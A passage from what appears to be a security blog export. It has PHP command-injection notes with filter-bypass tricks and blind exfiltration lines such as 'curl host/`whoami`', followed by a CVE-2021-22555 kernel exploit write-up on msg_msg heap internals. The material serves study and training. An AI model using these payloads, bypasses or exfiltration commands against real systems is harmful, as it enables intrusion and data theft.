?>`。但是可以利用闭合形式来关闭`PHP`再重新打开。比如\n\n  ```\n  echo \"In PHP mode!\"; ?> In HTML mode!<?php echo \"Back in PHP mode!\";\n  ```\n\n- 传入的必须是有效的`PHP`代码，并且以分号`;`来进行语句分割，没有正常分割的话会导致一个`parse error`。\n\n#### ②`assert`函数\n\n```\nbool assert(mixed $assertion[,string $description])\n```\n\n`PHP`中用来判断一个表达式是否成立，返回布尔值。\n\n如果`assertion`为字符串，那么它会被`assert()`当作`PHP`代码来执行。\n\n#### ③`preg_replace`函数\n\n```\nmixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int $limit = -1[,int &$count]])\n```\n\n对字符串进行正则处理。搜索`subject`中匹配`pattern`的部分，以`replacement`来进行替换。当`$pattern`参数中存在`/e`修饰符时，`$replacement`的值会被当作`PHP`代码执行。\n\n- `PHP5.5.0`开始，传入`\\e`修饰符会产生`E_DEPRECATED`错误，但是还是可以生效。而`PHP7.0.0`开始，会产生`E_WARNINIG`错误，同时`\\e`无法生效\n\n如下代码，传入`_=phpinfo();`即可触发`phpinfo`函数\n\n```\necho preg_replace('/\\s/e',$_POST[_],$str);\n```\n\n#### ④调用函数过滤不当\n\n通常用在框架中，小程序很少\n\n`call_user_func()、call_user_func_array()、array_map()`等几十个函数都可以调用其他函数的功能，其中第一个参数为调用的函数名称，如果这个函数名称可控，那么就可以调用任意函数。\n\n```\nmixed call_user_func(callable $callback[,mixed $paramenter[,mixed $....]])\n```\n\n如下代码所示，传入`_assert`即可\n\n```php\ncall_user_func($_POST[_],'phpinfo()');\n```\n\n#### ⑤动态函数执行\n\n可拼接字符串当作函数\n\n```php\n$a = 'a'.'s'.'s'.'e'.'r'.'t';\n$a('phpinfo()');\n```\n\n或者\n\n```\n$_GET['a']($_POST[_]);\n```\n\n那么传入`a=assert`和`_=phpinfo();`即可，但是不能传递`eval`。\n\n#### ⑥可用执行命令漏洞函数\n\n- `string system(string $command[,int &$return_var])`\n\n  函数执行`command`参数所指定的命令，并且输出执行结果\n\n- `string exec(string $command[,array &$output[,int &$return_var]])`\n\n  执行`command`指定的命令\n\n- `string shell_exec(string $cmd)`\n\n  通过`shell`环境执行命令，将完整的输出以字符串形式返回。\n\n- `void passthru(string $command[,int &$return_var])`\n\n  执行外部程序并且显示原始的输出\n\n- ``反引号\n\n  利用`ls`，会被当作系统命令执行，其实就是`shell_exec()`函数进行处理。\n\n- `void pcntl_exec(string $path[,array $args[,array $envs]])`\n\n  多进程处理扩展，需要额外进行安装才行。\n\n- `resource popen(string $command,string $mode)`\n\n  打开一个指向进程的管道，该进程由给定的`command`命令产生。\n\n- `resource proc_open(string $cmd,array $descriptorspec,array &$pipes[,string $cwd[,array $env[,array $other_options]]])`\n\n  更强大一些，但是需要指定更多的参数\n\n- `bool ob_start([callback $output_callback[,int $chunk_size[,bool $erase]]])`\n\n  控制输出缓冲的，相当于另外开辟一片缓冲区，可通过`ob_end_flush`来输出缓冲区\n\n  可选参数`$output_callback`被指定后，`ob_flush/ob_clean`或者类似的函数进行刷新时，会调用该回调函数，并且调用时输出缓冲区的内容会被当作参数去执行，并且返回一个新的缓冲区作为结果。\n\n```php\nsystem('whoami');\necho exec('whoami');\necho shell_exec('whoami');\npassthru('whoami');\necho `whoami`;\npcntl_exec(\"/bin/bash\",array('whoami'));\n\npopen('whoami >> 123.txt','r');\necho file_get_contents('1.txt');\n\n$descriptorspec = array(\n0=>array(\"pipe\",\"r\")),\n1=>array(\"pipe\",\"w\")),\n2=>array(\"pipe\",\"a\"));\n//控制标准输入输出和错误输出\nproc_open(\"whoami >> 1.txt\",$descriptorspec,$pipes);\necho file_get_contents(\"1.txt\");\n\n$cmd = 'system';\nob_start($cmd);\necho \"$_GET[a]\";\nob_end_flush();//会输出缓冲区内容\n//传入为whoami即可执行命令\n```\n\n### (2)绕过\n\n- 命令方面\n\n`&`、`|`、`;`、`&&`、`||`之类的\n\n- 空格绕过\n\n  - `IFS`，为`shell`的内置变量，用于分割字段，默认值为空(可当作空格、`tab`、换行)。\n\n    ```\n    cat${IFS}text\n    ```\n\n  - `{}`\n\n    ```\n    {cat,text}\n    ```\n\n  - `tab`\n\n    ```\n    cat%09text\n    ```\n\n  - 重定向\n\n    ```\n    cat<text\n    ```\n\n- 黑名单绕过\n\n  - 拼接\n\n    ```\n    a=c;b=at;c=tex;d=t;$a$b ${c}${d}\n    ```\n\n  - 使用环境变量\n\n    ```\n    echo ${SHELLOPTS}\n    echo ${SHELLOPTS:3:1}\n    {SHELLOPTS:3:1}at${IFS}text\n    ```\n\n    ![image-20220613112926445](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613112926445.png)\n\n  - 使用空变量\n\n    ```\n    cat t{x}ext\n    ```\n\n  - 使用通配符\n\n    ```\n    /bin/ca? tex?\n    ```\n\n    ![image-20220613113027598](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113027598.png)\n\n  - 使用反斜杠\n\n    ```\n    ca\\t tex\\t\n    ```\n\n    ![image-20220613113106132](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113106132.png)\n\n  - `base64`编码\n\n    ```\n    echo t|base64\n    ca$(echo \"dAo=\"|base -d) text\n    ```\n\n    ![image-20220613113225371](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113225371.png)\n\n- 无回显绕过\n\n  - 使用`HTTP`通道带出数据\n\n    ```\n    curl host/`whoami`\n    ```\n\n    ![image-20220613114812865](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613114812865.png)\n\n  - 使用`DNS`通道带出数据\n\n    一样的\n\n    ```\n    ping `whoami`.host\n    ```\n\n  - 编码\n\n    ```\n    curl hosts/$(whoami|base64)\n    ```\n\n### (3)防御\n\n正则表达式白名单、过滤\n\n\n\n## 漏洞JAVA反序列化\n\n从数据对象反序列化成内存对象的过程，主要是各种链子，有点困难，需要后续慢慢研究。\n","tags":["WEB"],"categories":["WEB","实训"]},{"title":"CVE-2021-22555","url":"/2022/04/15/CVE-2021-22555_Netfilter堆溢出提权漏洞/","content":"\n# 环境搭建\n\n参考文章：\n\n[CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/254027)\n\n或者我写的菜鸡项目：\n\n[KernelAll](https://github.com/PIG-007/kernelAll.git)\n\n## 🔺注：\n\n注意的是，在我写的项目里的CVE环境中，去掉了配置：`CONFIG_SECURITY=n`，原因是在`load_msg()`函数中申请`msg_msg`结构体时，如下所示，会调用到`security_msg_msg_alloc()`函数，给`msg_msg`结构体中的`security`指针赋值，导致下面漏洞利用时读取伪造`msg_msg`结构体由于检测`security`导致出错。\n\n```c\n//v5.11.14 /ipc/msgutil.c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n    //....\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\treturn msg;\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n而去掉了配置：`CONFIG_SECURITY=n`，可以不用`security`指针，这样就不会出错了\n\n```c\n//v5.11.14 /include/linux/security.h\n#ifdef CONFIG_SECURITY\n//.....\nint security_msg_msg_alloc(struct msg_msg *msg);\nvoid security_msg_msg_free(struct msg_msg *msg);\nint security_msg_queue_alloc(struct kern_ipc_perm *msq);\nvoid security_msg_queue_free(struct kern_ipc_perm *msq);\nint security_msg_queue_associate(struct kern_ipc_perm *msq, int msqflg);\nint security_msg_queue_msgctl(struct kern_ipc_perm *msq, int cmd);\nint security_msg_queue_msgsnd(struct kern_ipc_perm *msq,\n\t\t\t      struct msg_msg *msg, int msqflg);\nint security_msg_queue_msgrcv(struct kern_ipc_perm *msq, struct msg_msg *msg,\n\t\t\t      struct task_struct *target, long type, int mode);\n//....\n#else /* CONFIG_SECURITY */\n//....\nstatic inline int security_msg_msg_alloc(struct msg_msg *msg){return 0;}\nstatic inline void security_msg_msg_free(struct msg_msg *msg){ }\n\nstatic inline int security_msg_queue_alloc(struct kern_ipc_perm *msq){return 0;}\n\nstatic inline void security_msg_queue_free(struct kern_ipc_perm *msq){ }\n\nstatic inline int security_msg_queue_associate(struct kern_ipc_perm *msq,\n\t\t\t\t\t       int msqflg){return 0;}\n\nstatic inline int security_msg_queue_msgctl(struct kern_ipc_perm *msq, int cmd){return 0;}\n\nstatic inline int security_msg_queue_msgsnd(struct kern_ipc_perm *msq,\n\t\t\t\t\t    struct msg_msg *msg, int msqflg){return 0;}\n\nstatic inline int security_msg_queue_msgrcv(struct kern_ipc_perm *msq,\n\t\t\t\t\t    struct msg_msg *msg,\n\t\t\t\t\t    struct task_struct *target,\n\t\t\t\t\t    long type, int mode){return 0;}\n//....\n#endif\t/* CONFIG_SECURITY */\n```\n\n但是在`bsauce`师傅提供的环境中有添加该配置，而`security`指针的值却还是为空。简单看了一下源码，如下函数链\n\n```\nload_msg()->security_msg_msg_alloc()->lsm_msg_msg_alloc()\n```\n\n对于`lsm_msg_msg_alloc()`函数如下定义\n\n```c\nstatic int lsm_msg_msg_alloc(struct msg_msg *mp)\n{\n\tif (blob_sizes.lbs_msg_msg == 0) {\n\t\tmp->security = NULL;\n\t\treturn 0;\n\t}\n\n\tmp->security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);\n\tif (mp->security == NULL)\n\t\treturn -ENOMEM;\n\treturn 0;\n}\n```\n\n可以看到这里进行相关赋值，如果满足`blob_sizes.lbs_msg_msg == 0`那么其`security`指针为空，后续检测时也依据此判断不检测。而对于这个`blob_sizes.lbs_msg_msg`不是很熟悉，可能是我的相关配置问题吧。这里为了方便，我就直接将这个配置去掉了。\n\n此外经过实际测试，源码也可以看出来，其实`security`也就是一个堆地址(以0x8递增)，是不断变化的，但是如果能泄露出其中一个，那么后续检测就能都通过了。\n\n\n\n# 前置知识\n\n完成这个漏洞的利用还是需要一些前置知识的，刚好利用这个漏洞重新完善一下相关的知识点。\n\n## 1.msg_msg结构体---kmalloc-16至kmalloc-1024\n\n这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下\n\n参照：[【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用)\n\n[Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252558)\n\n[Linux的进程间通信 - 消息队列 · Poor Zorro's Linux Book (gitbooks.io)](https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html)\n\n《Linux系统编程手册》\n\n虽然写的是最大`kmalloc-1024`，但是在堆喷时，可以连续`kmalloc(1024)`从而获得连续的堆内存分布，这样都释放掉之后再经过回收机制就可以申请到更大的`kmallo-xx`了。\n\n### (1)使用方法\n\n#### ①创建\n\n- 首先创建`queue_id`管理标志，对应于内核空间的`msg_queue`管理结构\n\n  ```c\n  //key要么使用ftok()算法生成,要么指定为IPC_PRIVATE\n  //代表着该消息队列在内核中唯一的标识符\n  //使用IPC_PRIVATE会生成全新的消息队列IPC对象\n  int32_t make_queue(key_t key, int msg_flag)\n  {\n      int32_t result;\n      if ((result = msgget(key, msg_flag)) == -1) \n      {\n          perror(\"msgget failure\");\n          exit(-1);\n      }\n      return result;\n  }\n  \n  int queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n  ```\n\n  使用简单封装的`msgget`函数或者系统调用号`__NR_msgget`，之后保存数据的消息就会在这个`queue_id`管理标志，以及内核空间的`msg_queue`管理结构下进行创建\n\n#### ②数据传输\n\n- 写入消息：\n\n  然后就可以依据`queue_id`写入消息了，不同于`pipe`和`socketpair`，这个需要特定的封装函数（`msgsnd/msgrcv`）或者对应的系统调用（`__NR_msgrcv/__NR_msgsnd`）来实现。\n\n  ```c\n  typedef struct\n  {\n          long mtype;\n          char mtext[1];\n  }msgp;\n  \n  //msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用\n  void send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n  {\n      if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n      {\n          perror(\"msgsend failure\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_send_buf[0x2000];\n  m_ts_size = 0x400-0x30;//任意指定\n  msg *message = (msg *)queue_send_buf;\n  message->mtype = 0;\n  send_msg(queue_id, message, m_ts_size, 0);\n  ```\n\n- 读取消息：\n\n  之后即可依据`queue_id`读取消息\n\n  ```c\n  void get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n  {\n      if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n      {\n          perror(\"msgrcv\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_recv_buf[0x2000];\n  m_ts_size = 0x400-0x30;//任意指定\n  get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n  ```\n\n- `mtype`\n\n  可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用\n\n  - 在写入消息时，指定`mtype`，后续接收消息时可以依据此`mtype`来进行非顺序接收\n  - 在读取消息时，指定`msgtyp`，分为如下情况\n    - `msgtyp`大于0：那么在`find_msg`函数中，就会将遍历寻找消息队列里的第一条等于`msgtyp`的消息，然后进行后续操作。\n    - `msgtyp`等于0：即类似于顺序读取，`find_msg`函数会直接获取到消息队列首个消息。\n    - `msgtyp`小于0：会将等待的消息当成优先队列来处理，`mtype`的值越小，其优先级越高。\n\n- `msg_flag`\n\n可以关注一下`MSG_NOERROR`标志位，比如说`msg_flag`没有设置`MSG_NOERROR`的时候，那么情况如下：\n\n假定获取消息时输入的长度`m_ts_size`为`0x200`，且这个长度大于通过`find_msg()`函数获取到的消息长度`0x200`，则可以顺利读取，如果该长度小于获取到的消息长度`0x200`，则会出现如下错误\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png)\n\n但是如果设置了`MSG_NOERROR`，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。\n\n```c\n//v5.11 /ipc/msg.c do_msgrcv函数中\nif ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n    msg = ERR_PTR(-E2BIG);\n    goto out_unlock0;\n}\n```\n\n此外还有更多的`msg_flag`，就不一一举例了。\n\n#### ③释放\n\n这个主要是用到`msgctl`封装函数或者`__NR_msgctl`系统调用，直接释放掉所有的消息结构，包括申请的`msg_queue`的结构\n\n```c\n//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等\nif(msgctl(queue_id,IPC_RMID,NULL)==-1)\n{\n    perror(\"msgctl\");\n    exit(-1);\n}\n```\n\n不过一般也用不到，可能某些合并obj的情况能用到?\n\n此外还有更多的`cmd`命令，常用来设置内核空间的`msg_queue`结构上的相关数据，不过多介绍了。\n\n#### 总结\n\n总结一下大致的使用方法如下\n\n```c\ntypedef struct\n{\n        long mtype;\n        char mtext[1];\n}msgp;\n\nint32_t make_queue(key_t key, int msg_flag)\n{\n    int32_t result;\n    if ((result = msgget(key, msg_flag)) == -1) \n    {\n        perror(\"msgget failure\");\n        exit(-1);\n    }\n    return result;\n}\n\n\n\nvoid get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n{\n    if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return;\n}\n\nvoid send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n{\n    if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n    {\n        perror(\"msgsend failure\");\n        exit(-1);\n    }\n    return;\n}\n\n\nint main()\n{\n    int queue_id, m_ts_size;\n    char queue_recv_buf[0x2000];\n    char queue_send_buf[0x2000];\n    \n    m_ts_size = 0x400-0x30;\n    msgp *message = (msgp *)queue_send_buf;\n    message->mtype = 0;\n    \n    memset(message->mtext,'\\xaa', m_ts_size);\n    memset(queue_recv_buf, '\\xbb', sizeof(queue_recv_buf));\n    \n    queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n    send_msg(queue_id, message, m_ts_size, 0);\n    get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n    \n    return 0;\n}\n```\n\n### (2)内存分配与释放\n\n#### ①创建\n\n##### A.内存申请\n\n- 还是需要先创建`msg_queue`结构体，使用`msgget`函数，调用链为\n\n  ```\n  msgget(key,msg_flag)->ksys_msgget()->ipcget()->ipcget_new()->newque()\n  ```\n\n  主要还是关注最后的`newque()`函数，在该函数中使用`kvmalloc()`申请堆块，大小为0x100，属于`kmalloc-256`，(不同版本大小貌似不同)。\n\n  ```c\n  //v5.11 /ipc/msg.c\n  static int newque(struct ipc_namespace *ns, struct ipc_params *params)\n  {\n  \tstruct msg_queue *msq;\n  \tint retval;\n  \tkey_t key = params->key;\n  \tint msgflg = params->flg;\n  \n      //这个才是实际申请的堆块内存\n  \tmsq = kvmalloc(sizeof(*msq), GFP_KERNEL);\n  \tif (unlikely(!msq))\n  \t\treturn -ENOMEM;\n  \n  \tmsq->q_perm.mode = msgflg & S_IRWXUGO;\n  \tmsq->q_perm.key = key;\n  \n  \tmsq->q_perm.security = NULL;\n      //进行相关注册\n  \tretval = security_msg_queue_alloc(&msq->q_perm);\n  \tif (retval) {\n  \t\tkvfree(msq);\n  \t\treturn retval;\n  \t}\n  \n      //初始化\n  \tmsq->q_stime = msq->q_rtime = 0;\n  \tmsq->q_ctime = ktime_get_real_seconds();\n  \tmsq->q_cbytes = msq->q_qnum = 0;\n  \tmsq->q_qbytes = ns->msg_ctlmnb;\n  \tmsq->q_lspid = msq->q_lrpid = NULL;\n  \tINIT_LIST_HEAD(&msq->q_messages);\n  \tINIT_LIST_HEAD(&msq->q_receivers);\n  \tINIT_LIST_HEAD(&msq->q_senders);\n  \n      //下面一堆看不懂在干啥\n  \t/* ipc_addid() locks msq upon success. */\n  \tretval = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);\n  \tif (retval < 0) {\n  \t\tipc_rcu_putref(&msq->q_perm, msg_rcu_free);\n  \t\treturn retval;\n  \t}\n  \tipc_unlock_object(&msq->q_perm);\n  \trcu_read_unlock();\n  \n  \treturn msq->q_perm.id;\n  }\n  ```\n\n  创建的结构体如下所示\n\n  ```c\n  //v5.11 /ipc/msg.c\n  struct msg_queue {\n      //这些为一些相关信息\n  \tstruct kern_ipc_perm q_perm;\n  \ttime64_t q_stime;\t\t/* last msgsnd time */\n  \ttime64_t q_rtime;\t\t/* last msgrcv time */\n  \ttime64_t q_ctime;\t\t/* last change time */\n  \tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\n  \tunsigned long q_qnum;\t\t/* number of messages in queue */\n  \tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\n  \tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\n  \tstruct pid *q_lrpid;\t\t/* last receive pid */\n  \n      //存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF\n      //和该消息队列里的所有消息组成双向循环链表\n  \tstruct list_head q_messages;\n  \tstruct list_head q_receivers;\n  \tstruct list_head q_senders;\n  } __randomize_layout;\n  \n  ```\n\n- 接着当使用`msgsnd`函数传递消息时，会创建新的`msg_msg`结构体，消息过长的话就会创建更多的`msg_msgseg`来存储更多的消息。相关的函数调用链如下：\n\n  ```c\n  msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)->do_msgsnd()->load_msg()->alloc_msg()\n  ```\n\n  主要还是关注在`alloc_msg()`函数\n\n  ```c\n  //v5.11 /ipc/msgutil.c\n  static struct msg_msg *alloc_msg(size_t len)\n  {\n  \tstruct msg_msg *msg;\n  \tstruct msg_msgseg **pseg;\n  \tsize_t alen;\n  \n      //最大发送DATALEN_MSG长度的消息\n      //#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n      //这里的PAGE_SIZE为0x400,即最多kmalloc-\n  \talen = min(len, DATALEN_MSG);\n      //使用正常\n  \tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\n  \tif (msg == NULL)\n  \t\treturn NULL;\n  \n      //如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。\n      //使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。\n      //最大也为0x400,也属于kmalloc-1024\n      //还有再长的消息,就再申请msg_msgseg\n  \tmsg->next = NULL;\n  \tmsg->security = NULL;\n  \tlen -= alen;\n  \tpseg = &msg->next;\n  \twhile (len > 0) {\n  \t\tstruct msg_msgseg *seg;\n  \t\t//不知道干啥的\n  \t\tcond_resched();\n  \n  \t\talen = min(len, DATALEN_SEG);\n  \t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\n          //申请完之后,将msg_msgseg放到msg->next这个单向链表上\n  \t\tif (seg == NULL)\n  \t\t\tgoto out_err;\n  \t\t*pseg = seg;\n  \t\tseg->next = NULL;\n  \t\tpseg = &seg->next;\n  \t\tlen -= alen;\n  \t}\n  \n  \treturn msg;\n  \n  out_err:\n  \tfree_msg(msg);\n  \treturn NULL;\n  }\n  ```\n\n  - `msg_msg`结构体如下，头部大小`0x30`\n\n    ```c\n    //v5.11 /include/linux/msg.h\n    struct msg_msg {\n    \tstruct list_head m_list;//与msg_queue或者其他的msg_msg组成双向循环链表\n    \tlong m_type;\n    \tsize_t m_ts;\t\t/* message text size */\n    \tstruct msg_msgseg *next;//单向链表，指向该条信息后面的msg_msgseg\n    \tvoid *security;\n    \t/* the actual message follows immediately */\n    };\n    ```\n\n    如下所示\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png\" alt=\"image-20220511220130886\" style=\"zoom:80%;\" />\n\n  - `msg_msgseq`结构如下，只是一个`struct msg_msgseg*`指针\n\n    ```c\n    //v5.11 /ipc/msgutil.c\n    struct msg_msgseg {\n    \tstruct msg_msgseg *next;\n    \t/* the next part of the message follows immediately */\n    };\n    ```\n\n    如下所示\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png\" alt=\"image-20220511220627775\" style=\"zoom:80%;\" />\n\n###### 相关内存结构：\n\n在一个`msg_queue`队列下，消息长度为`0x1000-0x30-0x8-0x8-0x8`\n\n- 一条消息：\n\n  ![image-20220511231539231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png)\n\n- 两条消息：\n\n  以`msg_queue`的`struct list_head q_messages;`域为链表头，和`msg_msg`结构的`struct list_head m_list`域串联所有的`msg_msg`形成双向循环链表\n\n  ![未命名文件](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png)\n\n同理，同一个`msg_queue`消息队列下的多条消息也是类似的\n\n###### 内存申请总结：\n\n- 使用`msgget()`函数创建内核空间的消息队列结构`msg_msgseg`，返回值为消息队列的`id`标志`queue_id`\n  - `msg_msgseg`管理整个消息队列，大小为0x100，`kmalloc-256`。\n  - 其`struct list_head q_messages;`域为链表头，和`msg_msg`结构的`struct list_head m_list`域串联所有的`msg_msg`形成双向循环链表\n- 每次在该消息队列`queue_id`下调用`msgsnd()`函数都会申请内核空间的`msg_msg`结构，消息长度大于`0x400-0x30`就会申请内核空间的`msg_msgseg`结构\n  - `msg_msg`为每条消息存放消息数据的结构，与`msg_queue`形成双向循环链表，与`msg_msgseg`形成单向链表大小最大为0x400，属于`kmalloc-64`至`kmalloc-1024`\n  - `msg_msgseg`也为每条消息存放消息数据的结构，挂在`msg_msg`单向链表中，大小最大为`0x400`，属于`kmalloc-16`至`kmalloc-1024`，当消息长度很长时就会申请很多的内核空间的`msg_msgseg`结构。\n\n\n\n##### B.数据复制\n\n调用完`alloc_msg()`函数后，回到`load_msg()`函数接着进行数据复制，函数还是挺简单的。\n\n```c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n\tif (msg == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n    //先复制进msg_msg中存放消息的部分\n\talen = min(len, DATALEN_MSG);\n\tif (copy_from_user(msg + 1, src, alen))\n\t\tgoto out_err;\n\n    //遍历msg_msg下的msg_msgseg,逐个存放数据进去\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tsrc = (char __user *)src + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_from_user(seg + 1, src, alen))\n\t\t\tgoto out_err;\n\t}\n\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\n\treturn msg;\n\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n\n\n#### ②释放\n\n相关的函数调用链\n\n```\nmsgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)->SYS_msgrcv()->ksys_msgrcv()->do_msgrcv()->do_msg_fill()->store_msg()\n```\n\n首先关注一下`do_msgrcv()`函数，里面很多东西都比较重要\n\n```c\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,\n                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))\n{\n    int mode;\n    struct msg_queue *msq;\n    struct ipc_namespace *ns;\n    struct msg_msg *msg, *copy = NULL;\n    DEFINE_WAKE_Q(wake_q);\n    //....\n    if (msqid < 0 || (long) bufsz < 0)\n        return -EINVAL;\n    //设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink\n    if (msgflg & MSG_COPY) {\n        //从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错\n        if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))\n            return -EINVAL;\n        //这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg\n        //传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了\n        //不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉\n        copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));\n        /*\n        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)\n        {\n            struct msg_msg *copy;\n            \n            copy = load_msg(buf, bufsz);\n            if (!IS_ERR(copy))\n                copy->m_ts = bufsz;\n            return copy;\n        }\n        */\n        if (IS_ERR(copy))\n            return PTR_ERR(copy);\n    }\n    //这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除\n    //只是释放堆块,在后续的代码中有显示\n    //......\n    //开始从msg_queue中寻找合适的msg_msg\n    for (;;) {\n        //.....\n        msg = find_msg(msq, &msgtyp, mode);\n        if (!IS_ERR(msg)) {\n            /*\n\t\t\t * Found a suitable message.\n\t\t\t * Unlink it from the queue.\n\t\t\t */\n            //最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了\n            if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n                msg = ERR_PTR(-E2BIG);\n                goto out_unlock0;\n            }\n            /*\n\t\t\t * If we are copying, then do not unlink message and do\n\t\t\t * not update queue parameters.\n\t\t\t */\n            //设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg\n            if (msgflg & MSG_COPY) {\n                //这个copy_msg()函数就是之前提到的在汇编层面就很奇怪\n                msg = copy_msg(msg, copy);\n                goto out_unlock0;\n            }\n\n            //下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分\n            list_del(&msg->m_list);\n            msq->q_qnum--;\n            msq->q_rtime = ktime_get_real_seconds();\n            ipc_update_pid(&msq->q_lrpid, task_tgid(current));\n            msq->q_cbytes -= msg->m_ts;\n            atomic_sub(msg->m_ts, &ns->msg_bytes);\n            atomic_dec(&ns->msg_hdrs);\n            ss_wakeup(msq, &wake_q, false);\n\n            goto out_unlock0;\n        }\n        //....\n    }\n\nout_unlock0:\n    ipc_unlock_object(&msq->q_perm);\n    wake_up_q(&wake_q);\nout_unlock1:\n    rcu_read_unlock();\n    //如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块\n    if (IS_ERR(msg)) {\n        free_copy(copy);\n        return PTR_ERR(msg);\n    }\n    //这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制\n    bufsz = msg_handler(buf, msg, bufsz);\n    //最后在这里进行相关堆块的释放\n    free_msg(msg);\n\n    return bufsz;\n}\n\n```\n\n##### A.非堆块释放的数据读取\n\n一般而言，我们使用`msg_msg`进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合`MSG_COPY`这个`msgflg`标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的`unlink`触发错误。\n\n```c\n//v5.11 do_msgrcv()函数中的\n/* If we are copying, then do not unlink message and do\n    * not update queue parameters.\n    */\nif (msgflg & MSG_COPY) {\n    msg = copy_msg(msg, copy);\n    goto 